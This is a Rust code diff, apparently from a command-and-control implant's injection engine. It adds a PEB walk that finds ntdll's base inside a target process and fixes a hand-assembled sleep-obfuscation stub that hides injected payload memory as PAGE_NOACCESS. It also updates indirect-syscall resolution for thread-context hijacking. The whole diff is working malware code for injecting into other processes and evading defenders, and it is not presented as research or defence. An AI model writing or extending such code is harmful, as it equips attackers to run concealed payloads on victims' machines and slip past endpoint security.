@@ -642,6 +642,207 @@ impl InjectionHandle {
         Ok(())
     }
 
+    /// Resolve ntdll.dll's base address in the **target** process by walking
+    /// its PEB → PEB_LDR_DATA → InMemoryOrderModuleList.
+    ///
+    /// This is the fallback path when the agent's local ntdll base doesn't
+    /// match the target's (ASLR mismatch across sessions / different boot).
+    ///
+    /// # How it works
+    ///
+    /// 1. Call `NtQueryInformationProcess(ProcessBasicInformation)` to get the
+    ///    target's PEB address.
+    /// 2. Read the PEB.Ldr pointer to get `PEB_LDR_DATA`.
+    /// 3. Walk `InMemoryOrderModuleList` comparing base DLL name hashes.
+    /// 4. Return the matching module's `DllBase`.
+    unsafe fn resolve_ntdll_from_target_peb(&self) -> Result<usize, InjectionError> {
+        // ── Step 1: Get target PEB address via NtQueryInformationProcess ──
+        #[repr(C)]
+        struct ProcessBasicInformation {
+            reserved1: *mut c_void,
+            peb_base_address: *mut c_void,
+            reserved2: [*mut c_void; 2],
+            unique_process_id: usize,
+            reserved3: *mut c_void,
+        }
+
+        let mut pbi = std::mem::zeroed::<ProcessBasicInformation>();
+        let mut ret_len: u32 = 0;
+        let status = emulated_syscall!(
+            "NtQueryInformationProcess",
+            self.process_handle as u64,
+            0u64, // ProcessBasicInformation
+            &mut pbi as *mut _ as u64,
+            std::mem::size_of::<ProcessBasicInformation>() as u64,
+            &mut ret_len as *mut _ as u64,
+        );
+
+        if status.is_err() || status.unwrap() < 0 {
+            return Err(InjectionError::InjectionFailed {
+                technique: self.technique_used.clone(),
+                reason: "NtQueryInformationProcess(PBI) failed for target PEB walk".to_string(),
+            });
+        }
+
+        let target_peb = pbi.peb_base_address as u64;
+        if target_peb == 0 {
+            return Err(InjectionError::InjectionFailed {
+                technique: self.technique_used.clone(),
+                reason: "target PEB address is null".to_string(),
+            });
+        }
+
+        // ── Step 2: Read PEB.Ldr (offset 0x18 on x64) ──
+        let mut ldr_ptr: u64 = 0;
+        let mut bytes_read = 0usize;
+        let rs = emulated_syscall!(
+            "NtReadVirtualMemory",
+            self.process_handle as u64,
+            target_peb + 0x18, // PEB.Ldr offset
+            &mut ldr_ptr as *mut _ as u64,
+            8u64,
+            &mut bytes_read as *mut _ as u64,
+        );
+        if rs.is_err() || rs.unwrap() < 0 || bytes_read != 8 || ldr_ptr == 0 {
+            return Err(InjectionError::InjectionFailed {
+                technique: self.technique_used.clone(),
+                reason: "failed to read PEB.Ldr from target process".to_string(),
+            });
+        }
+
+        // ── Step 3: Read PEB_LDR_DATA.InMemoryOrderModuleListHead ──
+        // InMemoryOrderModuleList is at offset 0x20 in PEB_LDR_DATA.
+        let list_head_addr = ldr_ptr + 0x20;
+        let mut current_entry: u64 = 0;
+        let mut br = 0usize;
+        let rs = emulated_syscall!(
+            "NtReadVirtualMemory",
+            self.process_handle as u64,
+            list_head_addr,
+            &mut current_entry as *mut _ as u64,
+            8u64,
+            &mut br as *mut _ as u64,
+        );
+        if rs.is_err() || rs.unwrap() < 0 || br != 8 {
+            return Err(InjectionError::InjectionFailed {
+                technique: self.technique_used.clone(),
+                reason: "failed to read InMemoryOrderModuleList from target".to_string(),
+            });
+        }
+
+        // ── Step 4: Walk the list, looking for ntdll.dll by hash ──
+        let ntdll_hash = pe_resolve::hash_str(b"ntdll.dll\0");
+        let mut iterations = 0u32;
+        const MAX_MODULES: u32 = 256; // Safety limit
+
+        // LDR_DATA_TABLE_ENTRY layout (relevant fields):
+        //   InMemoryOrderLinks : LIST_ENTRY  at offset 0x08 (from InLoadOrder)
+        //   DllBase            : PVOID       at offset 0x30 (from InMemoryOrder start)
+        //   BaseDllName        : UNICODE_STRING at offset 0x50 (from InMemoryOrder start)
+        //   BaseDllName.Buffer is at +0x58, Length at +0x50
+
+        while current_entry != list_head_addr && iterations < MAX_MODULES {
+            iterations += 1;
+
+            // Read BaseDllName.Length (2 bytes at InMemoryOrderEntry + 0x50)
+            let mut name_len: u16 = 0;
+            let mut br2 = 0usize;
+            let rs = emulated_syscall!(
+                "NtReadVirtualMemory",
+                self.process_handle as u64,
+                current_entry + 0x50,
+                &mut name_len as *mut _ as u64,
+                2u64,
+                &mut br2 as *mut _ as u64,
+            );
+            if rs.is_err() || rs.unwrap() < 0 || br2 != 2 {
+                break;
+            }
+
+            if name_len > 0 && name_len <= 260 {
+                // Read BaseDllName.Buffer pointer (8 bytes at +0x58)
+                let mut name_buf_ptr: u64 = 0;
+                let mut br3 = 0usize;
+                let rs = emulated_syscall!(
+                    "NtReadVirtualMemory",
+                    self.process_handle as u64,
+                    current_entry + 0x58,
+                    &mut name_buf_ptr as *mut _ as u64,
+                    8u64,
+                    &mut br3 as *mut _ as u64,
+                );
+                if rs.is_ok() && rs.unwrap() >= 0 && br3 == 8 && name_buf_ptr != 0 {
+                    let name_byte_len = name_len as usize;
+                    let mut name_buf = vec![0u8; name_byte_len];
+                    let mut br4 = 0usize;
+                    let rs = emulated_syscall!(
+                        "NtReadVirtualMemory",
+                        self.process_handle as u64,
+                        name_buf_ptr,
+                        name_buf.as_mut_ptr() as u64,
+                        name_byte_len as u64,
+                        &mut br4 as *mut _ as u64,
+                    );
+                    if rs.is_ok() && rs.unwrap() >= 0 && br4 == name_byte_len {
+                        // Convert UTF-16LE to lowercase ASCII for hashing.
+                        let ascii_name: Vec<u8> = name_buf
+                            .chunks_exact(2)
+                            .filter_map(|chunk| {
+                                let c = u16::from_le_bytes([chunk[0], chunk[1]]);
+                                if c > 0x7F { return None; }
+                                Some(c.to_ascii_lowercase() as u8)
+                            })
+                            .collect();
+
+                        // Hash and compare.
+                        if pe_resolve::hash_str(&ascii_name) == ntdll_hash {
+                            // Found ntdll! Read DllBase (+0x30 from InMemoryOrder).
+                            let mut dll_base: u64 = 0;
+                            let mut br5 = 0usize;
+                            let rs = emulated_syscall!(
+                                "NtReadVirtualMemory",
+                                self.process_handle as u64,
+                                current_entry + 0x30,
+                                &mut dll_base as *mut _ as u64,
+                                8u64,
+                                &mut br5 as *mut _ as u64,
+                            );
+                            if rs.is_ok() && rs.unwrap() >= 0 && br5 == 8 && dll_base != 0 {
+                                log::info!(
+                                    "injection_engine: resolved ntdll in target pid {} \
+                                     via PEB walk: {:#x}",
+                                    self.target_pid, dll_base
+                                );
+                                return Ok(dll_base as usize);
+                            }
+                        }
+                    }
+                }
+            }
+
+            // Advance to next entry: read Flink (first 8 bytes of LIST_ENTRY).
+            let mut flink: u64 = 0;
+            let mut br6 = 0usize;
+            let rs = emulated_syscall!(
+                "NtReadVirtualMemory",
+                self.process_handle as u64,
+                current_entry,
+                &mut flink as *mut _ as u64,
+                8u64,
+                &mut br6 as *mut _ as u64,
+            );
+            if rs.is_err() || rs.unwrap() < 0 || br6 != 8 || flink == current_entry {
+                break; // Corrupted list or end.
+            }
+            current_entry = flink;
+        }
+
+        Err(InjectionError::InjectionFailed {
+            technique: self.technique_used.clone(),
+            reason: "could not find ntdll.dll in target PEB module list".to_string(),
+        })
+    }
+
     /// Enroll the injected payload in the parent agent's sleep obfuscation
     /// cycle.
     ///
@@ -713,12 +914,51 @@ impl InjectionHandle {
             let payload_base = self.injected_base_addr;
             let payload_size = self.payload_size;
 
-            // ── Resolve required addresses via pe_resolve ───────────────────
-            let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
+            // ── Resolve required addresses for the TARGET process ───────────
+            //
+            // BUG I-1 FIX: We must resolve ntdll's base address *in the target
+            // process*, not in the agent.  Windows ASLR is per-boot, so ntdll
+            // is typically at the same address in every process, but we validate
+            // this by reading the MZ header from the target.  If the check
+            // fails (different session / different ASLR base), we fall back to
+            // walking the target's PEB_LDR_DATA.
+
+            // Step 1: Get the agent's ntdll base as an initial guess.
+            let local_ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
                 .ok_or_else(|| InjectionError::InjectionFailed {
                     technique: self.technique_used.clone(),
                     reason: "cannot resolve ntdll for sleep stub".to_string(),
                 })?;
+
+            // Step 2: Validate by reading the MZ header from the target process.
+            let ntdll = {
+                let mut mz_check: [u8; 2] = [0u8; 2];
+                let mut bytes_read = 0usize;
+                let rs = emulated_syscall!(
+                    "NtReadVirtualMemory",
+                    self.process_handle as u64,
+                    local_ntdll as u64,
+                    mz_check.as_mut_ptr() as u64,
+                    2u64,
+                    &mut bytes_read as *mut _ as u64,
+                );
+
+                if rs.is_ok() && rs.unwrap() >= 0 && bytes_read == 2
+                    && mz_check == [0x4D, 0x5A]
+                {
+                    // MZ header matches — ntdll is at the same address.
+                    local_ntdll
+                } else {
+                    // MZ check failed — ntdll is at a different base in the
+                    // target.  Fall back to resolving via the target's PEB.
+                    log::warn!(
+                        "injection_engine: ntdll MZ mismatch at {:#x} in pid {}, \
+                         resolving from target PEB",
+                        local_ntdll, self.target_pid
+                    );
+                    self.resolve_ntdll_from_target_peb()?
+                }
+            };
 
             let nt_protect_addr = pe_resolve::get_proc_address_by_hash(
                 ntdll,
@@ -755,7 +995,7 @@ impl InjectionHandle {
             //   5. Restore registers
             //   6. Jump back to payload entry (or ret)
 
-            let mut stub: Vec<u8> = Vec::with_capacity(256);
+            let mut stub: Vec<u8> = Vec::with_capacity(280);
 
             // push rbp
             stub.push(0x55);
@@ -773,32 +1013,20 @@ impl InjectionHandle {
             stub.extend_from_slice(&[0x48, 0x83, 0xEC, 0x48]);
 
             // ── Store payload base and size on stack ────────────────────────
-            // mov [rbp-0x30], <payload_base>
-            // mov qword [rbp-0x30], imm64
-            stub.extend_from_slice(&[0x48, 0xC7, 0x45, 0xD0]);
-            stub.extend_from_slice(&(payload_base as u32).to_le_bytes());
-            // If address > 4GB, use movabs
-            if payload_base > 0xFFFFFFFF {
-                // Replace with proper movabs
-                stub.truncate(stub.len() - 8);
-                // mov rax, <payload_base>
-                stub.push(0x48);
-                stub.push(0xB8);
-                stub.extend_from_slice(&(payload_base as u64).to_le_bytes());
-                // mov [rbp-0x30], rax
-                stub.extend_from_slice(&[0x48, 0x89, 0x45, 0xD0]);
-            }
+            // BUG I-2/I-3 FIX: Always use full 64-bit movabs to avoid truncation.
+            // mov rax, <payload_base>  (10 bytes: 48 B8 <8 LE bytes>)
+            // mov [rbp-0x30], rax      (4 bytes: 48 89 45 D0)
+            stub.push(0x48);
+            stub.push(0xB8);
+            stub.extend_from_slice(&(payload_base as u64).to_le_bytes());
+            stub.extend_from_slice(&[0x48, 0x89, 0x45, 0xD0]);
 
-            // mov [rbp-0x38], <payload_size>
-            stub.extend_from_slice(&[0x48, 0xC7, 0x45, 0xC8]);
-            stub.extend_from_slice(&(payload_size as u32).to_le_bytes());
-            if payload_size > 0xFFFFFFFF {
-                stub.truncate(stub.len() - 8);
-                stub.push(0x48);
-                stub.push(0xB8);
-                stub.extend_from_slice(&(payload_size as u64).to_le_bytes());
-                stub.extend_from_slice(&[0x48, 0x89, 0x45, 0xC8]);
-            }
+            // mov rax, <payload_size>  (10 bytes)
+            // mov [rbp-0x38], rax      (4 bytes: 48 89 45 C8)
+            stub.push(0x48);
+            stub.push(0xB8);
+            stub.extend_from_slice(&(payload_size as u64).to_le_bytes());
+            stub.extend_from_slice(&[0x48, 0x89, 0x45, 0xC8]);
 
             // ── Step 1: NtProtectVirtualMemory → PAGE_NOACCESS ──────────────
             // NtProtectVirtualMemory(-1, &base, &size, PAGE_NOACCESS, &old_prot)
@@ -828,18 +1056,13 @@ impl InjectionHandle {
             stub.extend_from_slice(&[0xFF, 0xD0]);
 
             // ── Step 2: NtDelayExecution ────────────────────────────────────
-            // Store the delay value on stack.
-            // mov qword [rbp-0x40], <delay_100ns>
-            stub.extend_from_slice(&[0x48, 0xC7, 0x45, 0xC0]);
-            stub.extend_from_slice(&(delay_100ns as u32).to_le_bytes());
-            // If delay doesn't fit in 32 bits (very long sleep), use movabs
-            if (delay_100ns as u64) > 0xFFFFFFFF {
-                stub.truncate(stub.len() - 8);
-                stub.push(0x48);
-                stub.push(0xB8);
-                stub.extend_from_slice(&(delay_100ns as u64).to_le_bytes());
-                stub.extend_from_slice(&[0x48, 0x89, 0x45, 0xC0]);
-            }
+            // Store the delay value on stack (full 64-bit movabs).
+            // mov rax, <delay_100ns>   (10 bytes: 48 B8 <8 LE bytes>)
+            // mov [rbp-0x40], rax      (4 bytes: 48 89 45 C0)
+            stub.push(0x48);
+            stub.push(0xB8);
+            stub.extend_from_slice(&(delay_100ns as u64).to_le_bytes());
+            stub.extend_from_slice(&[0x48, 0x89, 0x45, 0xC0]);
 
             // NtDelayExecution(FALSE, &delay)
             // xor ecx, ecx   (Alertable = FALSE)
@@ -7491,13 +7714,13 @@ fn inject_context_only(
             })?;
 
         // Resolve NtGetContextThread and NtSetContextThread for indirect syscall.
-        let _nt_get_ctx = nt_syscall::get_syscall_id("NtGetContextThread").map_err(|e| {
+        let _nt_get_ctx = crate::syscalls::get_syscall_id("NtGetContextThread").map_err(|e| {
             InjectionError::InjectionFailed {
                 technique: InjectionTechnique::ContextOnly,
                 reason: format!("cannot resolve NtGetContextThread: {e}"),
             }
         })?;
-        let _nt_set_ctx = nt_syscall::get_syscall_id("NtSetContextThread").map_err(|e| {
+        let _nt_set_ctx = crate::syscalls::get_syscall_id("NtSetContextThread").map_err(|e| {
             InjectionError::InjectionFailed {
                 technique: InjectionTechnique::ContextOnly,
                 reason: format!("cannot resolve NtSetContextThread: {e}"),
@@ -8372,7 +8595,7 @@ fn inject_waiting_thread_hijack(
             })?;
 
         // Verify NtGetContextThread is available (we only read RSP, not set).
-        let _ = nt_syscall::get_syscall_id("NtGetContextThread").map_err(|e| {
+        let _ = crate::syscalls::get_syscall_id("NtGetContextThread").map_err(|e| {
             InjectionError::InjectionFailed {
                 technique: InjectionTechnique::WaitingThreadHijack {
                     target_pid: pid,
